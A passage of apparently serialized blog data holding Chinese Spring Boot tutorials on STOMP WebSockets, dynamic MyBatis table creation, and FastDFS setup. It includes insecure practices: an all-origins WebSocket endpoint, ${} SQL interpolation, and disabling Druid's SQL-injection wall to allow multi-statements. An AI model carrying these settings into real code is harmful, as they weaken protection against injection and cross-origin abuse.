org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;\nimport org.springframework.web.socket.config.annotation.StompEndpointRegistry;\nimport org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;\n\n/**\n * 通过EnableWebSocketMessageBroker 开启使用STOMP协议来传输基于代理(message broker)的消息,此时浏览器支持使用@MessageMapping 就像支持@RequestMapping一样。\n * @author zhenghuasheng\n */\n@Configuration\n@EnableWebSocketMessageBroker\npublic class WebSocketConfig implements WebSocketMessageBrokerConfigurer {\n\n    /**\n     * 注册stomp的端点\n     */\n    @Override\n    public void registerStompEndpoints(StompEndpointRegistry registry) {\n        // 用户订阅主题的前缀 /topic 代表发布广播，即群发 /queue 代表点对点，即发指定用户\n        registry.addEndpoint("/webSocket")\n                // 设置跨域\n                .setAllowedOrigins("*")\n                //添加socket拦截器，用于从请求中获取客户端标识参数 目前没什么用，可以去掉\n                .addInterceptors(new MyHandShakeInterceptor())\n                .withSockJS();\n    }\n\n    /**\n     * 配置消息代理(message broker)\n     * @param registry\n     */\n    @Override\n    public void configureMessageBroker(MessageBrokerRegistry registry) {\n//        ThreadPoolTaskScheduler te = new ThreadPoolTaskScheduler();\n//        te.setPoolSize(1);\n//        te.setThreadNamePrefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // 代理用不到\n//        registry.enableStompBrokerRelay().setClientLogin("111").setClientPasscode("111").setRelayPort(8005);\n        // 订阅Broker名称\n        registry.enableSimpleBroker("/queue","/topic")\n                // 第一个参数表示服务器写入或发送心跳的频率。 第二个参数表示客户端发送心跳时间\n//                .setHeartbeatValue(new long[]{15000,3000})\n//                .setTaskScheduler(te)\n        ;\n        // 全局使用的消息前缀（客户端订阅路径上会体现出来）\n//        registry.setApplicationDestinationPrefixes("/app");\n        // 点对点使用的订阅前缀（客户端订阅路径上会体现出来），不设置的话，默认也是/user/\n        // registry.setUserDestinationPrefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 前端代码\n\n依赖\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\n封装 stomp.js\n\nimport SockJS from \'sockjs-client\'\nimport Stomp from \'webstomp-client\'\n\nexport default {\n  // 是否启用日志 默认启用\n  debug:true,\n  // 客户端连接信息\n  stompClient:{},\n  // 初始化\n  init(callBack){\n    const socket = new SockJS(\'http://127.0.0.1:8005/webSocket\')\n    this.stompClient = Stomp.over(socket)\n    this.stompClient.hasDebug = this.debug\n    this.stompClient.connect({},suce =>{\n      this.console("连接成功,信息如下 ↓");\n      this.console(this.stompClient);\n      if(callBack){\n        callBack();\n      }\n    },err => {\n      if(err) {\n        this.console("连接失败,信息如下 ↓")\n        this.console(err)\n      }\n    });\n  },\n  // 订阅\n  sub(address,callBack){\n    if(!this.stompClient.connected){\n      this.console("没有连接,无法订阅");\n      return;\n    }\n    // 生成 id\n    let timestamp= new Date().getTime() + address\n    this.console("订阅成功 -> "+address)\n    this.stompClient.subscribe(address,message => {\n      this.console(address+" 订阅消息通知,信息如下 ↓")\n      this.console(message)\n      let data = message.body;\n      callBack(data);\n    },{\n      id: timestamp\n    })\n  },\n  unSub(address){\n    if(!this.stompClient.connected){\n      this.console("没有连接,无法取消订阅 -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompClient.subscriptions){\n      if(item.endsWith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompClient.unsubscribe(id);\n    this.console("取消订阅成功 -> id:"+ id + " address:"+address)\n  },\n  // 断开连接\n  disconnect(callBack){\n    if(!this.stompClient.connected){\n      this.console("没有连接,无法断开连接");\n      return;\n    }\n    this.stompClient.disconnect(() =>{\n      console.log("断开成功")\n      if(callBack){\n        callBack()\n      }\n    });\n  },\n  // 单位 秒\n  reconnect(time){\n    setInterval(() =>{\n      if(!this.stompClient.connected){\n        this.console("重新连接中...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\n以上是我自己封装的一个 stomp.js，建议在登录之后调用 init，并且保证 订阅 和 init 等所有 API 在一个文件中使用，否则会 undefined。可以使用 eventBus 来传递数据。\n\n具体使用\n\n  mounted() {\n    // 初始化\n    stomp.init(() =>{\n      // 初始化成功 就执行订阅\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // 取消订阅\n      stomp.unSub("/topic")\n    })\n    //  启用重连 5秒检测一次\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n连接通了以后，如果说前端用 websocket 只是为了接收后端的消息，那么关于 topic 可以随便设置，这里的随便意思是后端不需要去在 configureMessageBroker 里设置任何东西，只需要和前端定义清楚 topic，后端可以动态 topic 给前端。如下：\n\n\n\n\n\n',normalizedContent:'# 后端代码\n\n依赖\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-websocket</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.messaging.simp.config.messagebrokerregistry;\nimport org.springframework.web.socket.config.annotation.enablewebsocketmessagebroker;\nimport org.springframework.web.socket.config.annotation.stompendpointregistry;\nimport org.springframework.web.socket.config.annotation.websocketmessagebrokerconfigurer;\n\n/**\n * 通过enablewebsocketmessagebroker 开启使用stomp协议来传输基于代理(message broker)的消息,此时浏览器支持使用@messagemapping 就像支持@requestmapping一样。\n * @author zhenghuasheng\n */\n@configuration\n@enablewebsocketmessagebroker\npublic class websocketconfig implements websocketmessagebrokerconfigurer {\n\n    /**\n     * 注册stomp的端点\n     */\n    @override\n    public void registerstompendpoints(stompendpointregistry registry) {\n        // 用户订阅主题的前缀 /topic 代表发布广播，即群发 /queue 代表点对点，即发指定用户\n        registry.addendpoint("/websocket")\n                // 设置跨域\n                .setallowedorigins("*")\n                //添加socket拦截器，用于从请求中获取客户端标识参数 目前没什么用，可以去掉\n                .addinterceptors(new myhandshakeinterceptor())\n                .withsockjs();\n    }\n\n    /**\n     * 配置消息代理(message broker)\n     * @param registry\n     */\n    @override\n    public void configuremessagebroker(messagebrokerregistry registry) {\n//        threadpooltaskscheduler te = new threadpooltaskscheduler();\n//        te.setpoolsize(1);\n//        te.setthreadnameprefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // 代理用不到\n//        registry.enablestompbrokerrelay().setclientlogin("111").setclientpasscode("111").setrelayport(8005);\n        // 订阅broker名称\n        registry.enablesimplebroker("/queue","/topic")\n                // 第一个参数表示服务器写入或发送心跳的频率。 第二个参数表示客户端发送心跳时间\n//                .setheartbeatvalue(new long[]{15000,3000})\n//                .settaskscheduler(te)\n        ;\n        // 全局使用的消息前缀（客户端订阅路径上会体现出来）\n//        registry.setapplicationdestinationprefixes("/app");\n        // 点对点使用的订阅前缀（客户端订阅路径上会体现出来），不设置的话，默认也是/user/\n        // registry.setuserdestinationprefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 前端代码\n\n依赖\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\n封装 stomp.js\n\nimport sockjs from \'sockjs-client\'\nimport stomp from \'webstomp-client\'\n\nexport default {\n  // 是否启用日志 默认启用\n  debug:true,\n  // 客户端连接信息\n  stompclient:{},\n  // 初始化\n  init(callback){\n    const socket = new sockjs(\'http://127.0.0.1:8005/websocket\')\n    this.stompclient = stomp.over(socket)\n    this.stompclient.hasdebug = this.debug\n    this.stompclient.connect({},suce =>{\n      this.console("连接成功,信息如下 ↓");\n      this.console(this.stompclient);\n      if(callback){\n        callback();\n      }\n    },err => {\n      if(err) {\n        this.console("连接失败,信息如下 ↓")\n        this.console(err)\n      }\n    });\n  },\n  // 订阅\n  sub(address,callback){\n    if(!this.stompclient.connected){\n      this.console("没有连接,无法订阅");\n      return;\n    }\n    // 生成 id\n    let timestamp= new date().gettime() + address\n    this.console("订阅成功 -> "+address)\n    this.stompclient.subscribe(address,message => {\n      this.console(address+" 订阅消息通知,信息如下 ↓")\n      this.console(message)\n      let data = message.body;\n      callback(data);\n    },{\n      id: timestamp\n    })\n  },\n  unsub(address){\n    if(!this.stompclient.connected){\n      this.console("没有连接,无法取消订阅 -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompclient.subscriptions){\n      if(item.endswith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompclient.unsubscribe(id);\n    this.console("取消订阅成功 -> id:"+ id + " address:"+address)\n  },\n  // 断开连接\n  disconnect(callback){\n    if(!this.stompclient.connected){\n      this.console("没有连接,无法断开连接");\n      return;\n    }\n    this.stompclient.disconnect(() =>{\n      console.log("断开成功")\n      if(callback){\n        callback()\n      }\n    });\n  },\n  // 单位 秒\n  reconnect(time){\n    setinterval(() =>{\n      if(!this.stompclient.connected){\n        this.console("重新连接中...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\n以上是我自己封装的一个 stomp.js，建议在登录之后调用 init，并且保证 订阅 和 init 等所有 api 在一个文件中使用，否则会 undefined。可以使用 eventbus 来传递数据。\n\n具体使用\n\n  mounted() {\n    // 初始化\n    stomp.init(() =>{\n      // 初始化成功 就执行订阅\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // 取消订阅\n      stomp.unsub("/topic")\n    })\n    //  启用重连 5秒检测一次\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n连接通了以后，如果说前端用 websocket 只是为了接收后端的消息，那么关于 topic 可以随便设置，这里的随便意思是后端不需要去在 configuremessagebroker 里设置任何东西，只需要和前端定义清楚 topic，后端可以动态 topic 给前端。如下：\n\n\n\n\n\n',charsets:{cjk:!0}},{title:"SpringBoot MyBatis 动态建表",frontmatter:{title:"SpringBoot MyBatis 动态建表",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/204.SpringBoot%20MyBatis%20%E5%8A%A8%E6%80%81%E5%BB%BA%E8%A1%A8.html",relativePath:"01.框架/01.Spring/03.spring boot/204.SpringBoot MyBatis 动态建表.md",key:"v-07e31ee4",path:"/spring/spring-boot/204/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'代码\n\n    <update  id="createTelemetryTable" parameterType="java.util.List">\n        <foreach item="item" index="index" collection="list">\n            CREATE TABLE if not exists `${item}` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n报错\n\nCaused by: java.sql.SQLException: sql injection violation, multi-statement not allow : CREATE TABLE if not exists `rt_telemetry_p` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\n解决房在，在 yml 里 数据库连接 url 中加入 allowMultiQueries=true ，在 yml 里 druid 配置中加入\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',normalizedContent:'代码\n\n    <update  id="createtelemetrytable" parametertype="java.util.list">\n        <foreach item="item" index="index" collection="list">\n            create table if not exists `${item}` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n报错\n\ncaused by: java.sql.sqlexception: sql injection violation, multi-statement not allow : create table if not exists `rt_telemetry_p` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\n解决房在，在 yml 里 数据库连接 url 中加入 allowmultiqueries=true ，在 yml 里 druid 配置中加入\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Spring Boot 集成 FastDFS",frontmatter:{title:"Spring Boot 集成 FastDFS",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/206/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/206.Spring%20Boot%20%E9%9B%86%E6%88%90%20FastDFS.html",relativePath:"01.框架/01.Spring/03.spring boot/206.Spring Boot 集成 FastDFS.md",key:"v-d16f8084",path:"/spring/spring-boot/206/",headers:[{level:2,title:"安装FastDFS",slug:"安装fastdfs",normalizedTitle:"安装 fastdfs",charIndex:2},{level:3,title:"系统软件",slug:"系统软件",normalizedTitle:"系统软件",charIndex:17},{level:3,title:"编译环境",slug:"编译环境",normalizedTitle:"编译环境",charIndex:238},{level:3,title:"磁盘目录",slug:"磁盘目录",normalizedTitle:"磁盘目录",charIndex:1452},{level:3,title:"安装libfastcommon",slug:"安装libfastcommon",normalizedTitle:"安装 libfastcommon",charIndex:1589},{level:3,title:"安装FastDFS",slug:"安装fastdfs-2",normalizedTitle:"安装 fastdfs",charIndex:2},{level:3,title:"安装fastdfs-nginx-module",slug:"安装fastdfs-nginx-module",normalizedTitle:"安装 fastdfs-nginx-module",charIndex:2226},{level:2,title:"单机部署",slug:"单机部署",normalizedTitle:"单机部署",charIndex:2573},{level:3,title:"tracker配置",slug:"tracker配置",normalizedTitle:"tracker 配置",charIndex:2582},{level:3,title:"storage配置",slug:"storage配置",normalizedTitle:"storage 配置",charIndex:2776},{level:3,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:3084},{level:4,title:"tracker",slug:"tracker",normalizedTitle:"tracker",charIndex:1907},{level:4,title:"storage",slug:"storage",normalizedTitle:"storage",charIndex:1963},{level:3,title:"client测试",slug:"client测试",normalizedTitle:"client 测试",charIndex:3493},{level:3,title:"nginx 配置访问",slug:"nginx-配置访问",normalizedTitle:"nginx 配置访问",charIndex:3962},{level:2,title:"分布式部署",slug:"分布式部署",normalizedTitle:"分布式部署",charIndex:5235},{level:3,title:"storage配置",slug:"storage配置-2",normalizedTitle:"storage 配置",charIndex:2776},{level:3,title:"client测试",slug:"client测试-2",normalizedTitle:"client 测试",charIndex:3493},{level:3,title:"配置nginx访问",slug:"配置nginx访问",normalizedTitle:"配置 nginx 访问",charIndex:6038},{level:2,title:"集成SpringBoot",slug:"集成springboot",normalizedTitle:"集成 springboot",charIndex:6662},{level:3,title:"引入依赖",slug:"引入依赖",normalizedTitle:"引入依赖",charIndex:6680},{level:3,title:"添加配置",slug:"添加配置",normalizedTitle:"添加配置",charIndex:6845},{level:3,title:"Controller",slug:"controller",normalizedTitle:"controller",charIndex:7005},{level:3,title:"实现",slug:"实现",normalizedTitle:"实现",charIndex:7317}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"安装FastDFS 系统软件 编译环境 磁盘目录 安装libfastcommon 安装FastDFS 安装fastdfs-nginx-module 单机部署 tracker配置 storage配置 启动 tracker storage client测试 nginx 配置访问 分布式部署 storage配置 client测试 配置nginx访问 集成SpringBoot 引入依赖 添加配置 Controller 实现",content:'# 安装 FastDFS\n\n\n# 系统软件\n\n名称                     说明\ncentos                 7.x\nlibfastcommon          FastDFS 分离出的一些公用函数包\nFastDFS                FastDFS 本体\nfastdfs-nginx-module   FastDFS 和 nginx 的关联模块\nnginx                  nginx-1.18.0\n\n\n# 编译环境\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\n如果出现以下错误\n\nLoaded plugins: fastestmirror\nLoading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n修改如下文件\n\nvi /usr/libexec/urlgrabber-ext-down\n#把第一行的\n#!/usr/bin/python\n\n#修改为，然后重新安装\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 磁盘目录\n\n说明                  位置\n所有安装包               /home/dfs/lib\n数据存储位置              /home/dfs/store\n这里我为了方便把日志什么的都放到了   /home/dfs/log\n\n\n# 安装 libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #编译安装\n\n\n1\n2\n3\n\n\n\n# 安装 FastDFS\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #编译安装\n#配置文件准备\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #客户端文件，测试用\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #供nginx访问使用\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #供nginx访问使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 安装 fastdfs-nginx-module\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\n配合 nginx 使用，关于 nginx 安装这里就不说了，安装后 nginx 需要配置如下：\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# 单机部署\n\n\n# tracker 配置\n\n#服务器ip为 10.24x.3x.xx2\n#我建议用ftp下载下来这些文件 本地修改\nvim /etc/fdfs/tracker.conf\n#需要修改的内容如下\nport=22122  # tracker服务器端口（默认22122,一般不修改）\nbase_path=/home/dfs/log  # 存储日志和数据的根目录\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.24x.3x.xx2:22122  # tracker服务器IP和端口\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 启动\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #启动tracker服务\n/etc/init.d/fdfs_trackerd restart #重启动tracker服务\n/etc/init.d/fdfs_trackerd stop #停止tracker服务\nchkconfig fdfs_trackerd on #自启动tracker服务\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #启动storage服务\n/etc/init.d/fdfs_storaged restart #重动storage服务\n/etc/init.d/fdfs_storaged stop #停止动storage服务\nchkconfig fdfs_storaged on #自启动storage服务\n\n\n1\n2\n3\n4\n\n\n\n# client 测试\n\n返回 groupX 意思就是成功了，文件被重新改名字并且被放在了某个地方\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #tracker服务器IP和端口\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n不知道可以用以下命令来搜找\n\n[root@node102 home]# find / -name CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n/home/dfs/store/data/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n\n\n\n# nginx 配置访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.24x.3x.xx2:22122  #tracker服务器IP和端口\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# 先把8888端口打开\n/sbin/iptables -I INPUT -p tcp --dport 8888 -j ACCEPT\n#测试下载，用外部浏览器访问刚才已传过的nginx安装包,引用返回的ID\nhttp://10.24x.3x.xx2:8888/group1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n如果 nginx 启动 unknown directive "ngx_fastdfs_module"，则是安装 nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src 失败，可以用./nginx -V 查看。\n\n[root@node102 sbin]# ./nginx -V\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC) \nbuilt with OpenSSL 1.0.2k-fips  26 Jan 2017\nTLS SNI support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 分布式部署\n\n\n# storage 配置\n\ntracker 配置 和单机部署是一样的不变，只需要改变 storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client 测试\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\n# 保存退出\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 配置 nginx 访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 集成 SpringBoot\n\n\n# 引入依赖\n\n<dependency>\n    <groupId>com.github.tobato</groupId>\n    <artifactId>fastdfs-client</artifactId>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 添加配置\n\nfdfs:\n  # 连接的超时时间\n  connect-timeout: 3000\n  # 读取的超时时间\n  so-timeout: 3000\n  #tracker服务所在的ip地址和端口号\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Controller\n\n@RestController\n@RequestMapping("/img")\npublic class ImgController {\n\n    @Autowired\n    private ImgServer imgServer;\n\n    @PostMapping("/push")\n    public ResponseData push(@RequestParam("file") MultipartFile file){\n        return imgServer.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 实现\n\n@Service\n@Slf4j\npublic class ImgServerImpl implements ImgServer {\n    @Autowired\n    FastFileStorageClient fastFileStorageClient;\n\n    @Override\n    public ResponseData<String> push(MultipartFile file) {\n        if (file.isEmpty()) {\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1000);\n        }\n        try {\n            log.info("开始上传 {}", file.getOriginalFilename());\n            String fileSuffix = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(".")+1);\n            StorePath storePath = fastFileStorageClient.uploadFile(file.getInputStream(), file.getSize(),fileSuffix, null);\n            String path = storePath.getFullPath();\n            log.info("上传成功");\n            return ResponseData.successResponse(path);\n        } catch (IOException e) {\n            log.error(e.toString(), e);\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1001.getCode(), e.toString());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',normalizedContent:'# 安装 fastdfs\n\n\n# 系统软件\n\n名称                     说明\ncentos                 7.x\nlibfastcommon          fastdfs 分离出的一些公用函数包\nfastdfs                fastdfs 本体\nfastdfs-nginx-module   fastdfs 和 nginx 的关联模块\nnginx                  nginx-1.18.0\n\n\n# 编译环境\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\n如果出现以下错误\n\nloaded plugins: fastestmirror\nloading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  